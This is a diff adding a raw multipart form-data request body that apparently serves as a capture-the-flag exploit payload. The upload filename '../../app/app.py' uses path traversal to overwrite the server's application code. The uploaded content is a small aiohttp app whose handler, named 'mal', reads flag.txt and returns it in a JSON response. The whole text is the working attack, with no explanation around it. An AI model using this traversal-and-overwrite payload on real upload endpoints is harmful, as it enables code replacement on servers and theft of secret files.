@@ -1,0 +1,17 @@
+-----------------------------974767299852498929531610575
+Content-Disposition: form-data; filename="../../app/app.py"
+Content-Type: text/plain
+
+from aiohttp import web
+
+routes = web.RouteTableDef()
+
+@routes.get("/")
+async def mal(request):
+    with open('flag.txt') as file:
+        flag = file.read()
+        return web.json_response({'flag': flag})
+
+app = web.Application()
+app.add_routes(routes)
+web.run_app(app)
